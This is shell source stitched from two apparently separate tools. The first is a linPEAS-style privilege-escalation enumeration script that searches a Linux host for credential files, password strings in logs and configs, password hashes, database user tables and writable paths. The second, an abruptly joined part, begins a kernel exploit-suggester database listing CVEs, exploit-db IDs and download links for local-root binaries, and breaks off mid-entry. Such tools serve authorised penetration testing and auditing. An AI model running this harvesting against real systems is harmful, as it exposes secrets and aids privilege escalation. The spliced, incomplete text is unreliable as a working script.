  backs=`find / -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bak\.*" -o -name "*\.bck" -o -name "*\.bck\.*" -o -name "*\.bk" -o -name "*\.bk\.*" -o -name "*\.old" -o -name "*\.old\.*" \) -not -path "/proc/*" 2>/dev/null` 
  printf "$backs\n" | while read b ; do 
    if [ -r "$b" ]; then 
      ls -l "$b" | grep -Ev "$notBackup" | grep -Ev "$notExtensions" | sed -${E} "s,backup|bck|\.bak|\.old,${C}[1;31m&${C}[0m,g"; 
    fi; 
  done
  echo ""

  ##-- IF) DB files
  printf $Y"[+] "$GREEN"Searching tables inside readable .db/.sql/.sqlite files (limit 100)\n"$NC
  dbfiles=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_OPT\n$FIND_USR\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E '.*\.db$|.*\.sqlite$|.*\.sqlite3$' | grep -E -v '/man/.*|/usr/.*|/var/cache/.*' | head -n 100)
  FILECMD="`command -v file 2>/dev/null`"
  if [ "$dbfiles" ]; then
    printf "$dbfiles\n" | while read f; do
      if [ "$FILECMD" ]; then
        echo "Found: `file \"$f\"`" | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${C}[1;31m&${C}[0m,g"; 
      else
        echo "Found: $f" | sed -${E} "s,\.db|\.sql|\.sqlite|\.sqlite3,${C}[1;31m&${C}[0m,g"; 
      fi
    done
    SQLITEPYTHON=""
    printf "$dbfiles\n" | while read f; do 
      if ([ -r "$f" ] && [ "$FILECMD" ] && [ "`file \"$f\" | grep -i sqlite`" ]) || ([ -r "$f" ] && [ ! "$FILECMD" ]); then #If readable and filecmd and sqlite, or readable and not filecmd
        printf $GREEN" -> Extracting tables from$NC $f $DG(limit 20)\n"$NC
        if [ "`command -v sqlite3 2>/dev/null`" ]; then
          tables=`sqlite3 $f ".tables" 2>/dev/null`
          #printf "$tables\n" | sed "s,user.*\|credential.*,${C}[1;31m&${C}[0m,g"
        elif [ "`command -v python 2>/dev/null`" ] || [ "`command -v python3 2>/dev/null`" ]; then
          SQLITEPYTHON=`command -v python 2>/dev/null || command -v python3 2>/dev/null`
          tables=`$SQLITEPYTHON -c "print('\n'.join([t[0] for t in __import__('sqlite3').connect('$f').cursor().execute('SELECT name FROM sqlite_master WHERE type=\'table\' and tbl_name NOT like \'sqlite_%\';').fetchall()]))" 2>/dev/null`
          #printf "$tables\n" | sed "s,user.*\|credential.*,${C}[1;31m&${C}[0m,g"
        else
          tables=""
        fi
        if [ "$tables" ]; then
           printf "$tables\n" | while read t; do
            columns=""
            # Search for credentials inside the table using sqlite3
            if [ -z "$SQLITEPYTHON" ]; then
              columns=`sqlite3 $f ".schema $t" 2>/dev/null | grep "CREATE TABLE"`
            # Search for credentials inside the table using python
            else
              columns=`$SQLITEPYTHON -c "print(__import__('sqlite3').connect('$f').cursor().execute('SELECT sql FROM sqlite_master WHERE type!=\'meta\' AND sql NOT NULL AND name =\'$t\';').fetchall()[0][0])" 2>/dev/null`
            fi
            #Check found columns for interesting fields
            INTCOLUMN=`echo "$columns" | grep -i "username\|passw\|credential\|email\|hash\|salt"`
            if [ "$INTCOLUMN" ]; then
              printf $B"  --> Found interesting column names in$NC $t $DG(output limit 10)\n"$NC | sed -${E} "s,user.*|credential.*,${C}[1;31m&${C}[0m,g"
              printf "$columns\n" | sed -${E} "s,username|passw|credential|email|hash|salt|$t,${C}[1;31m&${C}[0m,g"
              (sqlite3 $f "select * from $t" || $SQLITEPYTHON -c "print(', '.join([str(x) for x in __import__('sqlite3').connect('$f').cursor().execute('SELECT * FROM \'$t\';').fetchall()[0]]))") 2>/dev/null | head
            fi
          done
          echo ""
        fi
      fi
    done
  fi
  echo ""

  ##-- IF) Web files
  printf $Y"[+] "$GREEN"Web files?(output limit)\n"$NC
  ls -alhR /var/www/ 2>/dev/null | head
  ls -alhR /srv/www/htdocs/ 2>/dev/null | head
  ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head
  ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head
  echo ""

  ##-- IF) Interesting files
  printf $Y"[+] "$GREEN"Readable hidden interesting files\n"$NC
  printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data\n"$NC
  fils=$(echo "$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_MNT\n$FIND_VAR\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E '\.msmtprc|\.env|\.google_authenticator|\.recently-used.xbel|\.lesshst|.*_history|\.sudo_as_admin_successful|\.profile|.*bashrc|.*httpd\.conf|.*\.plan|\.htpasswd|\.gitconfig|\.git-credentials|\.git|\.svn|\.rhosts|hosts\.equiv')
  printf "$fils\n" | while read f; do 
    if [ -r "$f" ]; then 
      ls -ld "$f" 2>/dev/null | sed "s,\.msmtprc|\.env|.google_authenticator|_history|\.lesshst|.recently-used.xbel|\.sudo_as_admin_successful|.profile|bashrc|httpd.conf|\.plan|\.htpasswd|.gitconfig|\.git-credentials|.git|.svn|\.rhosts|hosts.equiv|\.ldaprc,${C}[1;31m&${C}[0m," | sed -${E} "s,$sh_usrs,${C}[1;96m&${C}[0m,g" | sed "s,$USER,${C}[1;95m&${C}[0m,g" | sed "s,root,${C}[1;31m&${C}[0m,g"; 
      if [ "`echo \"$f\" | grep \"_history\"`" ]; then
        printf $GREEN"Searching possible passwords inside $f (limit 100)\n"$NC
        cat "$f" | grep -aE "$pwd_inside_history" | sed '/^.\{150\}./d' | sed -${E} "s,$pwd_inside_history,${C}[1;31m&${C}[0m," | head -n 100
        echo ""
      elif [ "`echo \"$f\" | grep \"httpd.conf\"`" ]; then
        printf $GREEN"Checking for creds on $f\n"$NC
        cat "$f" | grep -v "^#" | grep -Ev "\W+\#|^#" | grep -E "htaccess|htpasswd" | grep -v "^$" | sed -${E} "s,htaccess.*|htpasswd.*,${C}[1;31m&${C}[0m,"
        echo ""
      elif [ "`echo \"$f\" | grep \"htpasswd\"`" ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | grep -v "^#" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
        echo ""
      elif [ "`echo \"$f\" | grep \"ldaprc\"`" ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | grep -v "^#" | sed -${E} "s,.*,${C}[1;31m&${C}[0m,"
        echo ""
      elif [ "`echo \"$f\" | grep \"\.env\"`" ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | grep -v "^#" | sed -${E} "s,[pP][aA][sS][sS].*,${C}[1;31m&${C}[0m,"
        echo ""
      elif [ "`echo \"$f\" | grep \"\.msmtprc\"`" ]; then
        printf $GREEN"Reading $f\n"$NC
        cat "$f" | grep -v "^#" | sed -${E} "s,user.*|password.*,${C}[1;31m&${C}[0m,"
        echo ""
      fi;
    fi; 
  done
  echo ""

  ##-- IF) All hidden files
  printf $Y"[+] "$GREEN"All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)\n"$NC
  find / -type f -iname ".*" ! -path "/sys/*" ! -path "/System/*" ! -path "/private/var/*" -exec ls -l {} \; 2>/dev/null | grep -v "\.env|\.google_authenticator|_history$|\.recently-used.xbel|\.lesshst|.sudo_as_admin_successful|\.profile|\.bashrc|\.plan|\.htpasswd|.gitconfig|\.git-credentials|\.rhosts|\.gitignore|.npmignore|\.listing|\.ignore|\.uuid|.depend|.placeholder|.gitkeep|.keep" | head -n 70
  echo ""

  ##-- IF) Readable files in /tmp, /var/tmp, bachups
  printf $Y"[+] "$GREEN"Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)\n"$NC
  filstmpback=`find /tmp /var/tmp /private/tmp /private/var/at/tmp /private/var/tmp $backup_folders_row -type f 2>/dev/null | head -n 70`
  printf "$filstmpback\n" | while read f; do if [ -r "$f" ]; then ls -l "$f" 2>/dev/null; fi; done
  echo ""

  ##-- IF) Interesting writable files by ownership or all
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Interesting writable files owned by me or writable by everyone (not in Home) (max 500)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files\n"$NC
    #In the next file, you need to specify type "d" and "f" to avoid fake link files apparently writable by all
    obmowbe=`find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | sort | uniq | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500`
    printf "$obmowbe\n" | while read entry; do
      if [ "`echo \"$entry\" | grep \"You_can_write_even_more_files_inside_last_directory\"`" ]; then printf $ITALIC"$entry\n"$NC;
      elif [ "`echo \"$entry\" | grep -E \"$writeVB\"`" ]; then 
        echo "$entry" | sed -${E} "s,$writeVB,${C}[1;31;103m&${C}[0m,"
      else
        echo "$entry" | sed -${E} "s,$writeB,${C}[1;31m&${C}[0m,"
      fi
    done
    echo ""
  fi

  ##-- IF) Interesting writable files by group
  if ! [ "$IAMROOT" ]; then
    printf $Y"[+] "$GREEN"Interesting GROUP writable files (not in Home) (max 500)\n"$NC
    printf $B"[i] "$Y"https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files\n"$NC
    for g in `groups`; do 
      printf "  Group "$GREEN"$g:\n"$NC; 
      iwfbg=`find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null | grep -Ev "$notExtensions" | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (act == pre){(cont += 1)} else {cont=0}; if (cont < 5){ print line_init; } if (cont == "5"){print "#)You_can_write_even_more_files_inside_last_directory\n"}; pre=act }' | head -n500`
      printf "$iwfbg\n" | while read entry; do
        if [ "`echo \"$entry\" | grep \"You_can_write_even_more_files_inside_last_directory\"`" ]; then printf $ITALIC"$entry\n"$NC;
        elif [ "`echo \"$entry\" | grep -E \"$writeVB\"`" ]; then 
          echo "$entry" | sed -${E} "s,$writeVB,${C}[1;31;103m&${C}[0m,"
        else
          echo "$entry" | sed -${E} "s,$writeB,${C}[1;31m&${C}[0m,"
        fi
      done
    done
    echo ""
  fi

  ##-- IF) Passwords in config PHP files
  printf $Y"[+] "$GREEN"Searching passwords in config PHP files\n"$NC
  configs=$(echo "$FIND_VAR\n$FIND_ETC\n$FIND_HOME\n$FIND_TMP\n$FIND_USR\n$FIND_OPT\n$FIND_PRIVATE\n$FIND_APPLICATIONS" | grep -E '.*config.*\.php|database.php|db.php|storage.php|settings.php')
  printf "$configs\n" | while read c; do grep -EiI "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" $c 2>/dev/null | grep -Ev "function|password.*= ?\"\"|password.*= ?''" | sed '/^.\{150\}./d' | sort | uniq | sed -${E} "s,[pP][aA][sS][sS][wW]|[dD][bB]_[pP][aA][sS][sS],${C}[1;31m&${C}[0m,g"; done
  echo ""

  ##-- IF) TTY passwords
  printf $Y"[+] "$GREEN"Checking for TTY (sudo/su) passwords in audit logs\n"$NC
  aureport --tty 2>/dev/null | grep -E "su |sudo " | sed -${E} "s,su|sudo,${C}[1;31m&${C}[0m,g"
  grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null | sed -${E} "s,\"su\"|\"sudo\",${C}[1;31m&${C}[0m,g" | sed -${E} "s,data=.*,${C}[1;31m&${C}[0m,g"
  echo ""

  ##-- IF) IPs inside logs
  printf $Y"[+] "$GREEN"Finding IPs inside logs (limit 70)\n"$NC
  (timeout 100 grep -R -a -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" /var/log/ /private/var/log) 2>/dev/null | grep -v "\.0\.\|:0\|\.0$" | sort | uniq -c | sort -r -n | head -n 70
  echo ""

  ##-- IF) Passwords inside logs
  printf $Y"[+] "$GREEN"Finding passwords inside logs (limit 70)\n"$NC
  (timeout 100 grep -R -i "pwd\|passw" /var/log/ /private/var/log) 2>/dev/null | sed '/^.\{150\}./d' | sort | uniq | grep -v "File does not exist:\|script not found or unable to stat:\|\"GET /.*\" 404" | head -n 70 | sed -${E} "s,pwd|passw,${C}[1;31m&${C}[0m,"
  echo ""

  ##-- IF) Emails inside logs
  printf $Y"[+] "$GREEN"Finding emails inside logs (limit 70)\n"$NC
  (timeout 100 grep -I -R -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" /var/log/ /private/var/log) 2>/dev/null | sort | uniq -c | sort -r -n | head -n 70 | sed -${E} "s,$knw_emails,${C}[1;32m&${C}[0m,g"
  echo "" 

  ##-- IF) Passwords files in home
  printf $Y"[+] "$GREEN"Finding *password* or *credential* files in home (limit 70)\n"$NC
  (echo "$FIND_HOME $FIND_USR" | grep -E '.*password.*|.*credential.*|creds.*' | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 3){ print line_init; } if (cont == "3"){print "  #)There are more creds/passwds files in the previous parent folder\n"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 70 | sed -${E} "s,password|credential,${C}[1;31m&${C}[0m," | sed "s,There are more creds/passwds files in the previous parent folder,${C}[3m&${C}[0m,") || echo_not_found
  echo ""

  if ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
    ##-- IF) Find possible files with passwords
    printf $Y"[+] "$GREEN"Finding passwords inside key folders (limit 70) - only PHP files\n"$NC
    intpwdfiles=`timeout 150 grep -RiIE "(pwd|passwd|password|PASSWD|PASSWORD|dbuser|dbpass).*[=:].+|define ?\('(\w*passw|\w*user|\w*datab)" $HOMESEARCH /var/www /usr/local/www/ $backup_folders_row /tmp /etc /root /mnt /Users /private 2>/dev/null`
    printf "$intpwdfiles" | grep -I ".php:" | sed '/^.\{150\}./d' | sort | uniq | grep -iIv "linpeas" | head -n 70 | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[dD][eE][fF][iI][nN][eE],${C}[1;31m&${C}[0m,g"
    echo ""

    printf $Y"[+] "$GREEN"Finding passwords inside key folders (limit 70) - no PHP files\n"$NC
    printf "$intpwdfiles" | grep -vI ".php:" | grep -E "^/" | grep ":" | sed '/^.\{150\}./d' | sort | uniq | grep -iIv "linpeas" | head -n 70 | sed -${E} "s,[pP][wW][dD]|[pP][aA][sS][sS][wW]|[dD][eE][fF][iI][nN][eE],${C}[1;31m&${C}[0m,g"
    echo ""

    ##-- IF) Find possible files with passwords
    printf $Y"[+] "$GREEN"Finding possible password variables inside key folders (limit 140)\n"$NC
    timeout 150 grep -RiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" $HOMESEARCH /Users 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables2,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables3,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables4,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables5,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables6,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables7,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables8,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables9,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables10,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables11,${C}[1;31m&${C}[0m,g"
    timeout 150 grep -RiIE "($pwd_in_variables1|$pwd_in_variables2|$pwd_in_variables3|$pwd_in_variables4|$pwd_in_variables5|$pwd_in_variables6|$pwd_in_variables7|$pwd_in_variables8|$pwd_in_variables9|$pwd_in_variables10|$pwd_in_variables11).*[=:].+" /var/www $backup_folders_row /tmp /etc /root /mnt /private 2>/dev/null | sed '/^.\{150\}./d' | grep -Ev "^#" | grep -iv "linpeas" | sort | uniq | head -n 70 | sed -${E} "s,$pwd_in_variables1,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables2,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables3,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables4,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables5,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables6,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables7,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables8,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables9,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables10,${C}[1;31m&${C}[0m,g" | sed -${E} "s,$pwd_in_variables11,${C}[1;31m&${C}[0m,g"
    echo ""

    ##-- IF) Find possible conf files with passwords
    printf $Y"[+] "$GREEN"Finding possible password in config files\n"$NC
    ppicf=`find $HOMESEARCH /etc /root /tmp /private /Applications -name "*.conf" -o -name "*.cnf" -o -name "*.config" -name "*.json" 2>/dev/null`
    printf "$ppicf\n" | while read f; do
      if [ "`grep -EiI 'passwd.*|creden.*' \"$f\" 2>/dev/null`" ]; then
        echo $ITALIC" $f"$NC
        grep -EiIo 'passw.*|creden.*' "$f" 2>/dev/null | sed -${E} "s,[pP][aA][sS][sS][wW]|[cC][rR][eE][dD][eE][nN],${C}[1;31m&${C}[0m,g"
      fi
    done
    echo ""

    ##-- IF) Find possible files with usernames
    printf $Y"[+] "$GREEN"Finding 'username' string inside key folders (limit 70)\n"$NC
    timeout 150 grep -RiIE "username.*[=:].+" $HOMESEARCH /Users 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | grep -v "/linpeas" | sort | uniq | head -n 70 | sed -${E} "s,[uU][sS][eE][rR][nN][aA][mM][eE],${C}[1;31m&${C}[0m,g"
    timeout 150 grep -RiIE "username.*[=:].+" /var/www $backup_folders_row /tmp /etc /root /mnt /private 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | grep -v "/linpeas" | sort | uniq | head -n 70 | sed -${E} "s,[uU][sS][eE][rR][nN][aA][mM][eE],${C}[1;31m&${C}[0m,g"
    echo ""

    ##-- IF) Specific hashes inside files
    printf $Y"[+] "$GREEN"Searching specific hashes inside files - less false positives (limit 70)\n"$NC
    regexblowfish='\$2[abxyz]?\$[0-9]{2}\$[a-zA-Z0-9_/\.]*'
    regexjoomlavbulletin='[0-9a-zA-Z]{32}:[a-zA-Z0-9_]{16,32}'
    regexphpbb3='\$H\$[a-zA-Z0-9_/\.]{31}'
    regexwp='\$P\$[a-zA-Z0-9_/\.]{31}'
    regexdrupal='\$S\$[a-zA-Z0-9_/\.]{52}'
    regexlinuxmd5='\$1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    regexapr1md5='\$apr1\$[a-zA-Z0-9_/\.]{8}\$[a-zA-Z0-9_/\.]{22}'
    regexsha512crypt='\$6\$[a-zA-Z0-9_/\.]{16}\$[a-zA-Z0-9_/\.]{86}'
    regexapachesha='\{SHA\}[0-9a-zA-Z/_=]{10,}'
    timeout 150 grep -RIEHo "$regexblowfish|$regexjoomlavbulletin|$regexphpbb3|$regexwp|$regexdrupal|$regexlinuxmd5|$regexapr1md5|$regexsha512crypt|$regexapachesha" /etc $backup_folders_row /tmp /var/tmp /var/www /root $HOMESEARCH /mnt /Users /private /Applications 2>/dev/null | grep -v "/.git/\|/sources/authors/" | grep -Ev "$notExtensions" | grep -Ev "0{20,}" | head -n 70 | sed "s,:.*,${C}[1;31m&${C}[0m,"
    echo ""
  fi

  if ! [ "$FAST" ] && ! [ "$SUPERFAST" ] && [ "$TIMEOUT" ]; then
    ##-- IF) Specific hashes inside files
    printf $Y"[+] "$GREEN"Searching md5/sha1/sha256/sha512 hashes inside files (limit 50 - only 1 per file)\n"$NC
    regexmd5='(^|[^a-zA-Z0-9])[a-fA-F0-9]{32}([^a-zA-Z0-9]|$)'
    regexsha1='(^|[^a-zA-Z0-9])[a-fA-F0-9]{40}([^a-zA-Z0-9]|$)'
    regexsha256='(^|[^a-zA-Z0-9])[a-fA-F0-9]{64}([^a-zA-Z0-9]|$)'
    regexsha512='(^|[^a-zA-Z0-9])[a-fA-F0-9]{128}([^a-zA-Z0-9]|$)'
    timeout 150 grep -RIEHo "$regexmd5|$regexsha1|$regexsha256|$regexsha512" /etc $backup_folders_row /tmp /var/tmp /var/www /root $HOMESEARCH /mnt /Users /private /Applications 2>/dev/null | grep -v "/.git/\|/sources/authors/" | grep -Ev "$notExtensions" | grep -Ev "0{20,}" | awk -F: '{if (pre != $1){ print $0; }; pre=$1}' | awk -F/ '{line_init=$0; if (!cont){ cont=0 }; $NF=""; act=$0; if (cont < 2){ print line_init; } if (cont == "2"){print "  #)There are more hashes files in the previous parent folder\n"}; if (act == pre){(cont += 1)} else {cont=0}; pre=act }' | head -n 50 | sed "s,:.*,${C}[1;31m&${C}[0m," | sed "s,There are more hashes files in the previous parent folder,${C}[3m&${C}[0m,"
    echo ""
  fi
  
  if ! [ "$SUPERFAST" ] && ! [ "$FAST" ]; then
    ##-- IF) Find URIs with user:password@hoststrings
    printf $Y"[+] "$GREEN"Finding URIs with user:password@host inside key folders\n"$NC
    timeout 150 grep -RiIE "://(.+):(.+)@" /var/www $backup_folders_row /tmp /etc /var/log /private/var/log 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" $HOMESEARCH 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" /mnt 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" /root 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" /Users 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" /private 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    timeout 150 grep -RiIE "://(.+):(.+)@" /Applications 2>/dev/null | sed '/^.\{150\}./d' | grep -v "#" | sort | uniq | sed -${E} "s,:\/\/(.+):(.+)@,://${C}[1;31m\1:\2${C}[0m@,g"
    echo  ""
  fi
fi



VERSION=v1.1

# bash colors
#txtred="\e[0;31m"
txtred="\e[91;1m"
txtgrn="\e[1;32m"
txtgray="\e[0;37m"
txtblu="\e[0;36m"
txtrst="\e[0m"
bldwht='\e[1;37m'
wht='\e[0;36m'
bldblu='\e[1;34m'
yellow='\e[1;93m'
lightyellow='\e[0;93m'

# input data
UNAME_A=""

# parsed data for current OS
KERNEL=""
OS=""
DISTRO=""
ARCH=""
PKG_LIST=""

# kernel config
KCONFIG=""

CVELIST_FILE=""

opt_fetch_bins=false
opt_fetch_srcs=false
opt_kernel_version=false
opt_uname_string=false
opt_pkglist_file=false
opt_cvelist_file=false
opt_checksec_mode=false
opt_full=false
opt_summary=false
opt_kernel_only=false
opt_userspace_only=false
opt_show_dos=false
opt_skip_more_checks=false
opt_skip_pkg_versions=false

ARGS=
SHORTOPTS="hVfbsu:k:dp:g"
LONGOPTS="help,version,full,fetch-binaries,fetch-sources,uname:,kernel:,show-dos,pkglist-file:,short,kernelspace-only,userspace-only,skip-more-checks,skip-pkg-versions,cvelist-file:,checksec"

## exploits database
declare -a EXPLOITS
declare -a EXPLOITS_USERSPACE

## temporary array for purpose of sorting exploits (based on exploits' rank)
declare -a exploits_to_sort
declare -a SORTED_EXPLOITS

############ LINUX KERNELSPACE EXPLOITS ####################
n=0

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} elflbl
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/elflbl
exploit-db: 744
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} uselib()
Reqs: pkg=linux-kernel,ver=2.4.29
Tags:
Rank: 1
analysis-url: http://isec.pl/vulnerabilities/isec-0021-uselib.txt
exploit-db: 778
Comments: Known to work only for 2.4 series (even though 2.6 is also vulnerable)
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-1235]${txtrst} krad3
Reqs: pkg=linux-kernel,ver>=2.6.5,ver<=2.6.11
Tags:
Rank: 1
exploit-db: 1397
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2004-0077]${txtrst} mremap_pte
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.2
Tags:
Rank: 1
exploit-db: 160
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} raptor_prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2031
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2004
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl2
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2005
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl3
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2006
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-2451]${txtrst} prctl4
Reqs: pkg=linux-kernel,ver>=2.6.13,ver<=2.6.17
Tags:
Rank: 1
exploit-db: 2011
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2006-3626]${txtrst} h00lyshit
Reqs: pkg=linux-kernel,ver>=2.6.8,ver<=2.6.16
Tags:
Rank: 1
bin-url: https://web.archive.org/web/20111103042904/http://tarantula.by.ru/localroot/2.6.x/h00lyshit
exploit-db: 2013
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice1
Reqs: pkg=linux-kernel,ver>=2.6.17,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5092
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-0600]${txtrst} vmsplice2
Reqs: pkg=linux-kernel,ver>=2.6.23,ver<=2.6.24
Tags:
Rank: 1
exploit-db: 5093
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} ftrex
Reqs: pkg=linux-kernel,ver>=2.6.11,ver<=2.6.22
Tags:
Rank: 1
exploit-db: 6851
Comments: world-writable sgid directory and shell that does not drop sgid privs upon exec (ash/sash) are required
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2008-4210]${txtrst} exit_notify
Reqs: pkg=linux-kernel,ver>=2.6.25,ver<=2.6.29
Tags:
Rank: 1
exploit-db: 8369
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692]${txtrst} sock_sendpage (simple version)
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
Tags: ubuntu=7.10,RHEL=4,fedora=4|5|6|7|8|9|10|11
Rank: 1
exploit-db: 9479
Comments: Works for systems with /proc/sys/vm/mmap_min_addr equal to 0
EOF
)

EXPLOITS[((n++))]=$(cat <<EOF
Name: ${txtgrn}[CVE-2009-2692,CVE-2009-1895]${txtrst} sock_sendpage
Reqs: pkg=linux-kernel,ver>=2.6.0,ver<=2.6.30
